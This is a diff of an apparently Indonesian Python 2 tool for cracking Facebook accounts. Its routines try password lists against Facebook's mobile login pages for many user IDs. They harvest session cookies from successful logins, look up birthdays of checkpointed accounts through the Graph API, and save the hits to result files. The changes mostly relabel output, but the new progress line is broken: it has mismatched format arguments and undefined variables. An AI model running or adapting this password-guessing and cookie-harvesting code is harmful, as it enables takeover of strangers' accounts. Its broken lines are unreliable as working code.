@@ -706,7 +706,7 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s[->]  %s • %s                %s' % (K,user,pw,N)
+                print '\r  %sCP NGAB : %s • %s                %s' % (K,user,pw,N)
                 wrt = ' [×]  %s • %s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -717,12 +717,13 @@ class __crack__:
 
     def __mbasic__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r [%s¢%s] [Cracking] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
+        sys.stdout.write('\r [%s#%s][Retakan] %s/%s [OK-:%s][CP-:%s] '%(str(loping),len(mi),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
             try: os.mkdir('results')
-            except: pass
+            except: pass 
             try:
             	_kontol = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
@@ -733,7 +734,7 @@ class __crack__:
             b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r  %s[->]  %s • %s • %s                 %s' % (H,user,pw,kuki,N)
+                print '\r  %sOK NGAB : %s • %s • %s                 %s' % (H,user,pw,kuki,N)
                 wrt = ' [✓]  %s • %s • %s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -745,7 +746,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s[->]  %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r  %sCP NGAB : %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×]  %s • %s • %s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -757,7 +758,7 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s[->]  %s • %s                %s' % (K,user,pw,N)
+                print '\r  %sCP NGAB : %s • %s                %s' % (K,user,pw,N)
                 wrt = ' [×]  %s • %s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -768,12 +769,13 @@ class __crack__:
 
     def __mfb__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r [%s¢%s] [Cracking] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
+        sys.stdout.write('\r [%s#%s][Retakan] %s/%s [OK-:%s][CP-:%s] '%(str(loping),len(mi),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
             try: os.mkdir('results')
-            except: pass
+            except: pass 
             try:
             	_kontol = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
@@ -784,7 +786,7 @@ class __crack__:
             b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r  %s[->]  %s • %s • %s                 %s' % (H,user,pw,kuki,N)
+                print '\r  %sOK NGAB : %s • %s • %s                 %s' % (H,user,pw,kuki,N)
                 wrt = ' [✓]  %s • %s • %s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -796,7 +798,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s[->]  %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r  %sCP NGAB : %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×]  %s • %s • %s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -808,7 +810,7 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s[->]  %s • %s                %s' % (K,user,pw,N)
+                print '\r  %sCP NGAB : %s • %s                %s' % (K,user,pw,N)
                 wrt = ' [×]  %s • %s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
